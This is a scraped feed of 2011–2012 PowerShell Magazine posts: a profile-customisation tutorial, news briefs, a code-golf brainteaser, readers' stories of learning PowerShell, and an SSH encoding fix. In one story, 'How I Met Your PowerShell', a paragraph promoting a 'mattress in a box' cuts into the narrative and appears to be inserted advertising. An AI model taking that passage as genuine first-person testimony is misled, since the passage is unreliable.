Pester, a PowerShell module I’ve authored, to help test my PowerShell scripts. When I start a new shell, I have the following available right away:\nPS\u0026gt; Get-Module ModuleType Name ExportedCommands Script Pester {It, Describe, New-Fixture, Invoke-Pester} Script posh-git {GitTabExpansion, Get-GitDirectory, Get-GitStatus, tgit} Script PsGet {Get-PsGetModuleInfo, Install-Module} To manage my PowerShell Modules I use a tool called PsGet which is easy and light-weight.\nModular function loader $here = Split-Path -Parent $MyInvocation.MyCommand.Path Resolve-Path $here\\functions\\*.ps1 | Where-Object { -not ($_.ProviderPath.Contains(*.Tests.*)) } | ForEach-Object { . $_.ProviderPath } This bit of code dotsources all ps1 files in my profile’s functions directory. I consciously chose to put re-usable functions in their own files in this directory. Here are a couple of the functions it imports:\n Edit-HostsFile – pretty much does what it says. I can never remember where Windows keeps its hosts file, can you? Get-Bits – returns the CPU architecture of your shell. Here’s this function in action:  PS\u0026gt; Get-Bits 64-bit Prompt feedback There’s a special function that you can put in your profile and it’s called “prompt”. It overrides the default prompt and allows you to specialize it the way you see fit. I found a wonderful prompt that looks nice and provides information about the current directory. I’ve added some extra code in there to make it context aware of git directories, which is a feature of PoshGit. I’ve also decided to put my prompt code in a prompt.ps1 file inside the directory that the modular function loader looks at.\nFunctions, and aliases, and variables! Oh, my! Here are some functions and customizations that I didn’t feel special enough to isolate on their own in the auto-loaded functions directory. This is where I feel the best place to put your specific customizations. For example, I put in a few shortcut functions that mimic UNIX commands that I use often.\n which – tells me the location of where an executable lives rm-rf – nukes a file or folder and all its contents touch – creates an empty file (this is demoed in figure 1) g – a shortcut for launching gvim  Venture down a different PATH $UserBinDir = \u0026quot;$($env:UserProfile)\\bin\u0026quot; $paths = @(\u0026quot;$($env:Path)\u0026quot;, $TransientScriptDir) Get-ChildItem $UserBinDir | Where-Object { $paths += $_.FullName } $env:Path = [String]::Join(\u0026amp;#8220;;\u0026amp;#8221;, $paths) Almost always, I tend to favor augmenting my user/session state rather than the persistent machine state. This is why I have a bit of code in my profile after my PATH with some user specific customizations. This way I can be sure my changes aren’t affecting things at a service level.\nOne of these custom paths is the $TransientScriptDir. This directory is an area where I put scripts that I’ve downloaded for testing. The PowerShell community still relies on a lot of copy and paste distribution so when I find something worth trying I throw it into a file in this directory. Once it’s there I can then execute the script from any location. Here it is in action:\nPS\u0026gt; \u0026#34;Write-Host Hello World!\u0026#34;\u0026#34; | Out-File $TransientScriptDir\\Say-Hello.ps1 PS\u0026gt; which Say-Hello.ps1 Definition C:\\Users\\smuc\\Documents\\WindowspowerShell\\scripts\\Say-Hello.ps1 PS\u0026gt; Say-Hello.ps1 Hello World! The other additions to my PATH are every directory in %userprofile%\\bin. Inside there I put stuff like curl, nuget, 7z, and other executable tools I find myself using on a day to day basis.\nShow it off Lastly, there’s one thing I can’t stress enough… keep your profile in source control! There’s no reason for not keeping it somewhere like github. If you take a look at https://github.com/scottmuc/poshfiles/ you can see that installation is as simple as a git clone and that’s it. As an added benefit, source control provides you is the ability to see what changes you’ve made.\nSummary So, that’s a quick tour of some of the things that you can do with your PowerShell Profile. Please post your own personal customizations and reference them here. This is new territory in the Windows world and there’s a lot of new ground to break!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/02/13/pimp-your-profile-2/","tags":["How To"],"title":"Pimp Your Profile"},{"categories":["News"],"contents":"The Data ONTAP PowerShell Toolkit 1.7 was released! This latest offering of the very popular PowerShell module for managing NetApp storage systems features over 900 cmdlets. You can find the announcement here, and download the module here (registration required).\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/02/02/data-ontap-powershell-toolkit-1-7/","tags":["News","NetApp"],"title":"Data ONTAP PowerShell Toolkit 1.7"},{"categories":["News"],"contents":"The Microsoft Scripting Guys formally announce the 2012 Scripting Games featuring Windows PowerShell. Read the announcement HERE.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/01/30/the-2012-powershell-scripting-games/","tags":["News","Scripting Games"],"title":"The 2012 PowerShell Scripting Games"},{"categories":["News"],"contents":"If you weren’t able to attend “PowerShell Essentials – Become a PowerShell Wiz, Too!” webcast presented by PowerShell MVP and trainer Dr. Tobias Weltner, it is now available online. Check out the webcast recording HERE! (Free registration needed).\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/01/29/power-essentials-become-a-powershell-wiz-too/","tags":["News"],"title":"PowerShell Essentials – Become a PowerShell Wiz, Too!"},{"categories":["News"],"contents":"For the first time the Nordic Infrastructure Conference (NIC) was held in Oslo, Norway on January 13th – 14th. More than 30 speakers held close to 60 sessions in two days divided into the tracks Security, Virtualization \u0026amp; Cloud, System Management, Unified Communication and Windows 8.\nThere was a total of 4 PowerShell sessions held by PowerShell MVPs Jan Egil Ring and Thomas Lee, which is now available for online viewing:\n   Speaker Session Slides Demos Video     Jan Egil Ring Introducing PowerShell 3.0 Link Link Link   Jan Egil Ring Practical PowerShell for the Windows Administrator Link Link Link   Thomas Lee An introduction to WMI And PowerShell N/A N/A Link   Thomas Lee WMI Eventing with PowerShell N/A N/A Link    Video-links to the other sessions are available here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/01/29/windows-powershell-sessions-from-nordic-infrastructure-conference-2012-available/","tags":["News","Conferences"],"title":"Windows PowerShell sessions from Nordic Infrastructure Conference 2012 available"},{"categories":["News"],"contents":"The PowerShell Deep Dive is going to be at The Experts Conference USA again this year! The event is being held in San Diego, CA from April 29 – May 2. More details HERE.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/01/27/its-time-for-another-powershell-deep-dive/","tags":["News","Conferences"],"title":"It’s Time For Another PowerShell Deep Dive!"},{"categories":["News"],"contents":"PowerWF and PowerSE 2.7 were released to the web and they can now be downloaded from HERE.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/01/24/powerwf-and-powerse-2-7/","tags":["News"],"title":"PowerWF and PowerSE 2.7"},{"categories":["News","SQL"],"contents":"PowerShell MVP Jim Christopher has published a new project on codeplex – SQLite PowerShell Provider. The new provider enables you to use SQLite databases from your PowerShell session by mounting the database as a drive. You can then use the standard provider cmdlets to perform CRUD operations on the database tables and records.\nThe provider supports both persistent (on-disk) and transient (memory-only) SQLite databases. In addition, the provider is transaction-aware.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/01/23/sqlite-powershell-provider/","tags":["SQL","News"],"title":"SQLite PowerShell Provider"},{"categories":["Learning PowerShell"],"contents":"Hi, my name is Adam and I wrote this article to try and entice other people into learning something new—and for me that was Microsoft PowerShell.\nIt started back a couple of years ago, but as a non-programmer, and more of a point and click person I knew that this was not going to be something I could learn in 24 hours, probably not even 48 hours. So, I began by purchasing a hardback PowerShell book “Windows PowerShell Step By Step” it seemed a good place to start, and it was. I was soon learning the way to script in PowerShell. I was soon searching on the web for everything PowerShell-related. It really was an information overload at first, thinking I would never really grasp this language, without copying examples from a book. So I purchased a few more hardback copies of PowerShell books: Pro Windows PowerShell, PowerShell in Practice, and PowerShell in Action.\nEven though my day job of being a 2nd line support technician had no requirements for scripting, one fine day a big opportunity presented itself. I was asked to go and shadow a consultant on surveying a site for a whole new system to be implemented. Part of the survey process was to get certain information from each PC/laptop onsite that the customer already had. The way it was being done was to get on your hands and knees, record the tiny half-scratched off serial number on the PC, or going into the BIOS to retrieve this info, then boot up the PC/laptop, and record how much RAM and hard disk space each PC/laptop had, then similar but more audit checks for servers. After shadowing this consultant for one day seeing how much time and effort needed to go into this process, I went home that evening and decided it was time to unleash the PowerShell I had been learning in my own time. That was a long but re-warding evening; I had developed a script that would obtain all the information required but AUTOMATICALLY without human intervention. On bigger sites it was taking 4 consultants several days to survey one site. PowerShell on the other hand could audit me 500 computers in 10 minutes. Yes, that is correct, 500 machines audited in 10 minutes, as opposed to days, and obviously no human error in recording the details. I did make several modifications to the script when requested. I have to say that I reached to Twitter for some queries, as Twitter has some really, really cool PowerShell ‘heads’ on there who always seem more than happy to answer a PowerShell question or query. In general I have found that anyone I chat to about PowerShell is more than happy to share the knowledge, which only makes the community stronger.\nThis then set me to start thinking what other things I could script for the company I work for. I knew the health checks were something I did not like doing as it was a boring point and click process and took some time to do, and obviously very repetitive. So again, with the help of the mighty PowerShell and WASP (a snap-in for PowerShell), I was able to automate this whole task, and even email myself the results!\nI knew another big project was coming up to remove certain software and required SQL to be uninstalled, and after using Google, I could not find any automatic way to uninstall SQL with no intervention. PowerShell with the WASP snap-in did the job again! What was even more pleasing was to hear that this was classed “impossible” to automate from other colleagues.\nI have even now been asked to write a script by our development team!\nI guess the point I’m trying to get across is since I have been learning PowerShell, nothing now seems ‘impossible’ anymore. And believe me if you read enough PowerShell it sticks!\nSeems PowerShell is being integrated into more and more Microsoft products, and is ultimately the future of scripting, and possibly Windows administration.\nSo, what are you waiting for? There are enough free PowerShell eBooks and other documentation on the Internet to wet your taste buds, so get on it and learn something new. Only last night looked into creating a custom troubleshooting pack for Windows 7, and again the actual bit that fixes your computer is PowerShell-scripted!\nI really do hope if you have not looked into PowerShell you do after reading this. Thanks for reading, and hopefully the next thing you will be reading is PowerShell-related.\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the “How I Learned to Stop Worrying and Love Windows PowerShell” contest.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/01/16/why-did-i-start-learning-powershell/","tags":["Learning PowerShell"],"title":"Why did I start learning PowerShell"},{"categories":["Brainteaser"],"contents":"Problem Your task is to write the shortest code to find one of the unused drive letters (excluding a,b and c). PowerShell’s default aliases are allowed. You have one week. Answers should be posted as a comment to this brain teaser. That’s it.\nThe winner gets a copy of the “VMware vSphere PowerCLI Reference” from Sybex!\nWe\u0026rsquo;ll post clues over the next couple days, stay tuned.\nGood Luck!\nSolution We have a winner: P!\nYour code was 36 characters long:\nfor($j=67;gdr($d=[char]++$j)2\u0026gt;0){}$d This is the breakdown of our solution (47 characters):\nls function:[d-z]: -n|?{!(test-path $_)} | random We took a different approach (though more lengthy) to get a list of available by listing the default A-Z functions and using the Name switch to get the names only.\nWe then tested if a drive with the incoming drive letter name was available, if so, it was written back to the pipeline.\nFinally, we used the Get-Random cmdlet to choose for us an available letter. As you can see we called Get-Random by its verb only. You may suspect that ‘random’ is an alias for that command but it isn\u0026rsquo;t. We used a known trick to shorten Get-Random – when PowerShell cannot resolve a command it tries to resolve it again by prepending the Get verb.\nWe hope you had fun and that you enjoyed participating and was able to learn a thing or two. See you in the next brain teaser.\nWe also would like to thanks our sponsors, Sybex, for giving away the book for the Winner.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/post/2012-01-12-find-an-unused-drive-letter/","tags":["Brainteaser"],"title":"Find an unused drive letter"},{"categories":["Learning PowerShell"],"contents":"Prologue My first encounter with PowerShell dates from late 2006. One of my colleagues came back from Microsoft IT Forum 2006 in Barcelona and was very enthusiastic about something that was called PowerShell. It was going to be the universal language to be used for all management of the Microsoft Back Office. I installed it and immediately liked how simple it was to achieve instant results. Writing a PowerShell script was nearly as if one was writing instructions in plain English. But since a lot of our 3th party products didn’t support PowerShell yet, it sort of moved to a backburner.\nEpisode 1 – 2007 Comes 2007 and a management decision to virtualize our Intel server park. We decided to go for the VMware solution. And as we were migrating physical servers to virtual servers, it became obvious that we would need some kind of automation to allow a reliable management of this new environment. I started looking at Perl, which was at that time the preferred automation language for VMware vSphere. But then by chance, I assume I was really feeling lucky in Google, I discovered a post about a new tool, called the VI Toolkit, to manage the VMware VI environment. And this VI Toolkit was a snap-in for PowerShell.\nFrom some more Googling I learned that the Program Manager for this VI Toolkit would be presenting a session at VMware TSX 2007 in Nice. So off to France I went.\nEpisode 2 – 2008 After the session, which was called “TA01 – Managing VMware With PowerShell”, I talked with Carter Shanklin, and was told I could get access to the closed beta of the VI Toolkit. Back home I downloaded the software and started following the VMTN Community for the VI Toolkit. It was in that Community that I first met Hal Rottenberg. Since Hal had already been playing with the VI Toolkit a bit longer, his replies to my beginner questions were extremely useful. By the time the VI Toolkit snap-in was made available as a public beta, in March 2008, I was able to manage most of VMware environment with PowerShell and the VI Toolkit.\nInstead of going to another language to manage the parts that were not (yet) covered by any of the VI Toolkit Cmdlets, I used the SDK APIs. The reason that this was possible was thanks to the Get-View Cmdlet, which provided access to all the methods and properties from the SDK APIs. That way (nearly) everything was possible. I’m convinced that part of the popularity that the VI Toolkit achieved, was thanks to the presence of this Get-View Cmdlet from day 1. What is not available through a Cmdlet can be done through one of the SDK API.\nI became a regular contributor to the VMTN VI Toolkit Community and I became more and more convinced that this VI Toolkit was the ideal vehicle to manage and automate a VMware environment. Also in 2008, Hal started writing his “Managing VMware Infrastructure with Windows PowerShell” book and I was honored to be asked as a technical editor for the book.\nEpisode 3 -2009-2011 All of a sudden this VI Toolkit, which was renamed to PowerCLI end of 2010, became an important part of my life. In 2009 I presented, together with Hal, my first VMworld session. In 2010 and 2011 I presented sessions at VMworld US and EMEA together with Alan Renouf. As proof of the immense popularity of PowerCLI, we had to give several repeats of our sessions.\nIn 2010-2011 I was permitted to co-author a book, called the “VMware vSphere PowerCLI Reference”, together with 4 fantastic co- authors. Alan, Glenn, Jonathan and Arnim, thanks for the ride guys. But to be honest, there are 2 events that I will most probably tell my grandchildren. During our VMworld in 2010, we had the father of PowerShell, Jeffery Snover, sitting in the audience. The other event was my invitation to attend the first PowerShell Deep Dive in 2011. I have books from more than half of the people present in the session’s room.\nWhy PowerCLI and PowerShell? I get this question asked a lot. I have a few reasons that were important for me. PowerShell is defined/built in such a way that a 1st-day user can be productive within minutes. That fact that the verb-noun constructs nearly read as plain English helps a lot. The language comes with a number of Cmdlets that allow you to do stuff that would otherwise take hours of coding. The Sort-Object and Group-Object Cmdlets are some of my all-time favorites. What is not available as a Cmdlet is most probably available as a method in the .Net framework. The fact that PowerShell gives you hassle-free access to this huge environment extends the possibilities of scripts enormously.\nThe future From VMware I see more and more functionality being added to their current PowerCLI offering. At the last VMworld they announced for example a complete set of Cmdlets to interact with vCD, their cloud management product. With Windows 8 Server and PowerShell v3 around the corner, I ultimately envisage all my servers to be core only and completely managed from PowerShell scripts. For someone who loves working/playing with PowerShell, the future looks bright.\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the “How I Learned to Stop Worrying and Love Windows PowerShell” contest.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/01/11/how-i-started-to-love-powershell/","tags":["Learning PowerShell"],"title":"How I started to love PowerShell"},{"categories":["Learning PowerShell"],"contents":"I have avoided programming for several years, particularly because I could not just wrap my mind around the concepts of objects, classes, loops, etc. In fact, a few times I bought books on visual basic, to C++ and Python, but could never get past “Hello World”; beyond that, things would just fall to pieces. It was also the reason I could never make it far as a Unix/Linux admin as automating tasks beyond a few commands in a batch file was certainly out of scope. Besides, the second line of every job ad was bash scripting. I stuck to windows.\nOne thing was for sure, I liked the command line. I have always felt it was easier to take control of things at the command level. Remembering that in the DOS days (and early windows 3 days), after battling with windows for a while, it was the command line that would resolve the problem for me. I did my best with the commands that came with windows, but how far could one go with that? The diversity of the structure of the commands made the learning curve even steeper.\nWhen I came across PowerShell for the first time I was drawn to:\n The consistency in the command structure – the verb-noun structure which signifies a simple instruction The ability to massage the output of a command to get a desired results The abundance of help and the willingness of the community to help The object pipeline And much more.  However after learning the initial commands Get-Service, Get-Process, and Get-Eventlog I asked myself, now what? It turns out, every book I read started with scripting on page 2 and I was intimidated. For an entire year I didn’t go back to PowerShell. The books I bought sat on my shelf gathering dust.\nDuring Teched 2011 Atlanta, I stumbled on a presentation by Don Jones – on PowerShell Remoting. I was amazed by what I could achieve with PowerShell. I ordered his book,\n_ Learn PowerShell in a month of Lunches,_ immediately after that presentation and did not regret it.\nMy intimidation evaporated after reading the first chapter. I told myself, this man was thinking about me when he wrote this book. In that book, written in plain English, I understood:\n The use of PowerShell’s built-in help, Get-Help PowerShell’s objects The pipeline and the meaning of byPropertyName and byvalue The use of get-member to discover the attributes of a command output.. And more.  There is no doubt that Don inspired me a lot in learning PowerShell, but it also important here to mention the great community that PowerShell has. Everyone is simply amazing. Each day as I read blogs or tweets, I never stop wondering how much information people are willing to share at no cost.\nI couldn’t believe my eyes when I read about Lee Holmes offering copies of his books to those who will go out to help someone in real world problems with PowerShell. That to me was simply amazing, and displays the power of the community.\nThe gentlemen of PowerScripting Podcast, Jon and Hal, __are doing such an incredible job. Each interview presented in that podcast takes my breath away. Jason Helmick’s interview, and my subsequent chat with him, gave me hope as an admin.\nI can’t begin to mention all that have inspired me in the community, as I’m sure no one wants to read a hundred pages of names.\nOf course the greatest inspiration is in what the shell itself is capable of doing. From the ability to create VMs in a matter of minutes, to the creation of a thousand Active directory users in seconds, and managing non-Microsoft products like VMware, Cisco, Netapp, etc, the product is simply amazing.\nMy next project is PowerShell in Action, Bruce Payette. I hope to advance my knowledge in PowerShell with that.\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the “How I Learned to Stop Worrying and Love Windows PowerShell” contest.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/01/09/my-inspiration/","tags":["Learning PowerShell"],"title":"My Inspiration"},{"categories":["Learning PowerShell","News"],"contents":"A month ago, we started a contest for our readers to share their first PowerShell experience — their PowerShell story. Along with that, we have also announced that there were prizes to win! And, today, we have come to an end of publishing the first round of articles. The response to these articles was just amazing. We have had several people submit the article pitch — we published a few of them and saved the rest for round two.\nToday, we are happy to announce the winners of the first round. These winners were chosen by a PowerShell script (no wonder!) and we have recorded the winner selection process in a video (view in full screen) and posted it on our YouTube channel.\n  And, the winners are …\nKarl Mitschke – TrainSignal PowerShell Tutorial videos!\nGayathri Naraynan \u0026amp; Jouse Castillo – Script Explorer invitations!\nCongratulations to the winners! Our editorial staff will reach out to you very soon. We would like to thank our sponsors of this contest TrainSignal and Microsoft Script Explorer development team for their support.\nHappy New Year!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/01/01/announcing-the-winners-of-the-powershell-story-series/","tags":["News","Learning PowerShell"],"title":"Announcing the winners of the PowerShell story series!"},{"categories":["Learning PowerShell"],"contents":"The Confession Hi. My name is Josh and:\n I love PowerShell and what it enables me to do. I have not always used PowerShell  While neither of these confessions is an Earth shattering revelation I would not have been able to make these statements 4 years ago. The truth is, I had no interest in PowerShell when I first heard about it. I thought it looked cool. I heard some of the cool kids were doing it but I’m usually not one to succumb to peer-pressure so I put it aside for another day and stuck with my DOS and VBScript. In a funny way though, I was already well on my way to being a PowerShell scripter.\nThe Chance Meeting During 2006 and 2007 I was spending more and more time writing applications with VB.net in Visual Studio. Learning object oriented programming and complex workflows was challenging but I was progressively improving and creating more advanced applications with the guidance of an excellent coworker. All was well until one day I was hit with a difficult realization. We were about to upgrade to Exchange 2007 and it REQUIRED the use of PowerShell!\nFortunately the great Douglas Adams had educated me well in the ways of the universe. Don’t Panic! During the project I began to pick up little pieces of PowerShell here and there. I learned the amazing cmdlet of Get-Help which I still use DAILY. Understanding of the pipeline started to click but the real magic started to happen when I began to grasp the fact that PowerShell was using objects…Just like .Net! \u0026lt;cue trumpets…Wait. Hold the music\u0026gt;\nSome of the folks on our team were farther ahead than others [not me] but we all began to see the Power in PowerShell. The Exchange upgrade project went well. We used our necessary cmdlets, and even created a few one-liners to pull information from time to time. PowerShell hit the shelf once more.\nIf you are scratching your head right now I don’t blame you. It’s almost like getting the keys to a Tardis and saying, “I think I just want to head to the pub down the street for a pint.” Don’t Panic! PowerShell re-entered my life soon after like a stranger you know you’ve met and talked to before, but neither of you recall when or where you met.\nWhen Josh Met PowerCLI Our reintroduction came with VMware’s PowerCLI and we’ve been best buddies ever since. While at the same firm I began to latch onto VMware’s technology like toddler to a tribble. What VMware could do was amazing and our environment started to multiply right before my eyes. When we just had a handful of physical systems management was kept to a minimum. Since a former manager had introduced VMware into our environment the capabilities of our department increased dramatically.\nThis expansion soon meant we had more management concerns on our hands. PowerCLI allowed me to quickly run audits on license counts of our VMs, check health and performance, automate VM snapshots and more. While most of the work was still done in vCenter I had finally found that common thread that got me hooked on PowerShell. It was also around this time I had the opportunity to really test myself in a much larger environment.\nGetting Serious My relationship with PowerShell started to become very serious when I took a role as resident virtualization guru with another company. I was now responsible for hundreds of VMs with several projects coming up requiring significant environment changes. I quickly went to work leading some re-architecture and writing increasingly complex scripts for configuring host networking, migrating VMs, and deploying custom attributes for system ownership. I continued to learn much and more about PowerCLI and PowerShell through the VMware Community forums, following a variety of blogs, and checking out Hal Rottenberg’s Managing VMware with PowerCLI book.\nThe Commitment In mid-2011 I was offered an opportunity to work for a company whose customer had a pretty large and in charge environment. We’re talking VMs in the thousands and systems all over the place. I felt I was taking another logarithmic step. I later learned that my experience with PowerCLI was a skill that had set me apart. It didn’t take long for me to feel like Nero must have felt when he first plugged back into the matrix. Now my scripting was meeting needs at a scale I hadn’t considered. It was overwhelming and exciting!\nIt was at this point that I had a little bit of a misstep, as I may have pushed myself a bit too hard. I wasn’t getting a lot of sleep, I was overworking myself, and overall my heath took a bit of a hit.\nI thought myself for a good long while, about what I was doing wrong, and how to turn it around. I had a few good theories on things to try, so I went about them as I was able to. I checked online to see what is the best mattress in a box, and found a good one I could afford. With a new, and very comfortable mattress, I had no issues falling asleep. From there the rest of the pieces fell into place and I was able to pick myself back up and become a contributor to the team.\nBeing a quick contributor to the team was very satisfying. There were already a couple of people with some solid scripting chops on the team. It was an amazing feeling being able to share my work with others and to give and get help from a team. It was also about this time I decided to start working harder to share my work with the community.\nThe Community It did not take me long to realize that I was repeating a considerable amount of effort in our scripts. I started working hard on developing advanced functions to meet various needs that showed up regularly. The scripting work we’re now migrating towards can almost be described as modular as we develop functions and snippets that can be reused at will. Advanced functions have become my mistress and this new work has required me to reach out for more advanced resources when needing assistance.\nThe PowerShell and PowerCLI community is amazing. The folks who blog and participate in the forums and Twitter are a wealth of information. There are some real River Tam’s out there that do amazing and scary things with PowerShell. The best part is that each and every one of them gets as excited about solving new problems with PowerShell as you and me. I trust that if you’ve read this far there is no argument on that last point. I have a long list of upcoming posts talking about a variety of issues I’ve solved that I can’t wait to share.\nThe last 6 months have been an amazing time in my PowerShell relationship. I now have my PowerCLI session open constantly. I’ve become a PowerShell first thinker and find myself solving a variety of problems with different cmdlets and scripts. Many of these little tidbits I share on my blog or on twitter while PowerShell podcasts have even become a weekly ritual (PowerScripting Podcast is a staple). I’m getting hooked on this PowerShell stuff! In fact, PowerShell and PowerCLI have become important enough for me to take a few hours out of my life to tell you all about our story together…so far.\nIf you’re new to PowerShell then Welcome! I hope my story has provided you with an outline of how I grew with PowerShell over the last few years and resources I’ve used along the way. If you’re a veteran then I’d bet we have some similarities in our growing relationship with PowerShell. I’d love to talk to all of you about stuff you’re working on and vice versa. I’m looking forward to reading your stories in this series as well! Cheers and May the –force be with you!\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the “How I Learned to Stop Worrying and Love Windows PowerShell” contest.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/30/how-i-met-your-powershell/","tags":["Learning PowerShell"],"title":"How I Met Your PowerShell"},{"categories":["Learning PowerShell"],"contents":"I used to be VBScripter, but not anymore. As I learned PowerShell, I slowly stopped using VBScript and now, I rarely write VB scripts. It’s been more than 5 years since PowerShell was released and I still learn PowerShell every day.\nI would like to share my experience, resources, some tips and hopefully some new beginners will learn from my mistakes.\nPipeline As a VB scripter, I started approaching PowerShell as a scripting language. I would write a small script to solve something and later realized, I could have done the same thing in one line using the pipeline, so don’t miss that one.\nGet-Help Read the PowerShell Help! Period. Start reading those errors which show up in red. Unless you read those error messages and try to understand them, you won’t learn much. Making mistakes and trying out different things, you’ll get errors, that is good. Read and understand them, ask why and soon you can explain how PowerShell does things the way it does. I have learned few things the hard way, so it will really help you a lot by reading this. You can probably download this offline PowerShell CHM file from here.\nHey Scripting Guy Blog Every day Ed Wilson, The Scripting Guy, writes a blog about PowerShell , 365 days a year. You can search through the archives for older posts to get started on PowerShell and learn different techniques. You can visit the blog here. If you still want to have fun with it, every year Ed conducts the Scripting Games , participate and put your skills to work. You will get a chance to write real world scripts and also get a chance to see how other people scripts.\nPowershell.com I like the tips which are posted here on a daily basis; they are really useful and you can search through the archives for previous tips as well. They even host a monthly webcast which are really useful, you just have to sign up and you can attend for free.\nPowershell Communities Look for a PowerShell community near your location, check out www.PowershellGroup.org. This website has most of the PowerShell communities around the world, try to join whichever is near you. These communities also conduct offline meetings in some place where you can attend in person and meet new people who are trying to learn PowerShell.\nTools I like how PowerShell emits Objects, unlike VBScript where I had to do a lot of string manipulation to get what I want. I instantly liked the PowerGUI Editor for writing my PowerShell scripts, the only reason I like it the most is because of the IntelliSense feature, so you can explore PowerShell better. For Example, if I type Get- ,PowerGUI will automatically show me the commands that start with the Get verb, this also applies to object properties:\nHere are some more resources, which might be helpful:\n List of free e-books, by Jason Five part webcast series on PowerShell by Ed Wilson If you need help on your PowerShell problem, there are people to help you on the TechNet forums.  Powershell Forum Scripting Guys Forum    I feel that all the efforts you invest won’t go to waste, now that we see that most of Microsoft Products are tightly integrated with PowerShell. Thanks to the PowerShell Magazine for giving me a chance to write about my PowerShell story.\nWould you like to share your story? Win one of TrainSignal’s PowerShell training courses? Learn more about the “How I Learned to Stop Worrying and Love Windows PowerShell” contest.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/28/my-powershell-story/","tags":["Learning PowerShell"],"title":"My PowerShell story"},{"categories":["Debugging"],"contents":"In my life I try to be on the edge of IT technology and if I find something interesting I try to be in touch with it. I’m a big fan of UNIX based systems and impressed by their reliability and flexibility. That is why I love Linux and Mac OS.\nI realize that Windows is the third major system, it’s still alive and used in most of companies around the world. Windows 7 looks better protected and much more reliable. So, I studied it and looked the new technologies it offered. The weak points in Windows were the reliability, security, virus protection and command line interface. I’m a big enthusiast of CLI (command line interface) on Linux systems and this article is dedicated to that.\nThe first time I heard about Windows PowerShell I said “Wow, that is crazy”. What a great idea, make the command line shell in Windows really powerful. I won’t compare it to UNIX bash here. It is clear that PowerShell gives system administrators the ability to automate their job and a way to control the Windows systems through slow network connections. That is great.\nIn addition to my CLI interests, I’m a big enthusiast of OS integration. I’ll explain what I mean. Usually in companies I’ve been at, there are offices with Windows 7 desktop computers and laptops. Some have Windows Servers or Linux. The companies who do design, advertisement, computer graphics, post-production or TV have all three systems in their network. That means: Mac OS, Linux, Windows 7 and even Windows XP. Control and integration is a problem. I’m looking for technology which can help. PowerShell and SSH may make this happen.\nUntil now, Windows 7 didn’t have SSH out of the box. It uses an outdated `telnet’ for console connections. Thanks to @ShayLevy for the tip on the PowerShell SSH Server from /n Software. It looks great for these types of integration. Plus, they have a free version with a one connection limit.\nThe problem I faced – we have a Russian version of Windows 7. That means if I try to connect it with SSH from Linux I get a question mark in PowerShell replies.\nThe problem is different locales. The Linux box has modern UTF-8, the Windows have their own WIN-1251 for the Russian language. So, PowerShell Server from /n Software translates the reply incorrectly encoded.\nI solved this by tweaking the registry for PowerShell Server.\nFirst, I need to make a new string parameter in `HKEY_LOCAL_MACHINE ➜ SOFTWARE ➜ PowerShellInside ➜ PowerShellServer’. The `WireEncoding’ should be set to `UTF-8′.\nThen I run PowerShell server as a Windows Service, restart it, and connect through SSH again. It now works with the correct Russian responses.\nHappy Holidays 🙂\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/12/27/powershell-linux-to-windows-integration-encoding-problem/","tags":["Debugging"],"title":"PowerShell Linux to Windows integration (encoding problem)"},{"categories":["Learning PowerShell"],"contents":"Writing for me has always been a daunting and seemingly endless task, one filled with pain. This is not due to the typical ‘writer’s block’ as I am full of ideas (sometimes referred to as bullshit from my friends), but the labor of the language itself has always challenged me. My inability to spell, incomplete and not well-formed sentences, along with things that dangle, I believe they are called participles.\nRecently, someone I respect highly told me to grow-up and learn these relatively simple concepts so that I could communicate my ideas better. Ideas that he admits may have some value to others. His kindness is appreciated, even when wrapped in his ‘snarky’ ways.\nThe reason I even mention my deficiency, and determination, to overcome my affliction, is that I suspect that many administrators feel similar about PowerShell. Put yourself in the position of a Windows Admin, one that has spent their entire career in the safety of clicking a set of rehearsed instructions. This admin, who’s entire livelihood hinges on learning the next new button sequence is suddenly thrust into using a new command line interface called PowerShell. Listening to Admins after they see PowerShell for the first time produces the typical list of phrases:\n Command line? Isn’t that a step backwards? New special commands called cmdlets? Great. I hate learning syntax, are you sure there is no graphical way? Looks like programming, I don’t want to be a programmer. Pipelines? I got into Windows because I didn’t want to be a UNIX admin!  These comments would be laughable to the PowerShell elite if it were not for the underlying reason for them. Talk to an Admin that is trying to get started using PowerShell and what you find is fear. Fear that this will be painful, that they will not be successful, fear that they will lose their job without it. Do you remember learning your first command line interface? Learning a command line interface for the first time is a daunting and seemingly endless task. A prompt, a blinking prompt, blinking in condemnation, blinking in expectation of your next typed command, a prompt that is very unforgiving of syntax mistakes; this is a hard to learn tool.\nSo, how do we get Admins over the fear and start working with PowerShell? As a community, take time from our litany of bit-twiddling ‘coding’ blogs, and illuminate how a single one-liner could produce similar results. Perhaps take the giant wealth of knowledge that this community has and focus it for just a few moments of building great solutions with one-liners and automation that an Admin can use on the job. Maybe even go so far as to remind new Admins that PowerShell is an interactive command line tool that has some scripting capabilities, and that you don’t need to become a programmer to be hugely successful in your career. Maybe we should even invite our UNIX 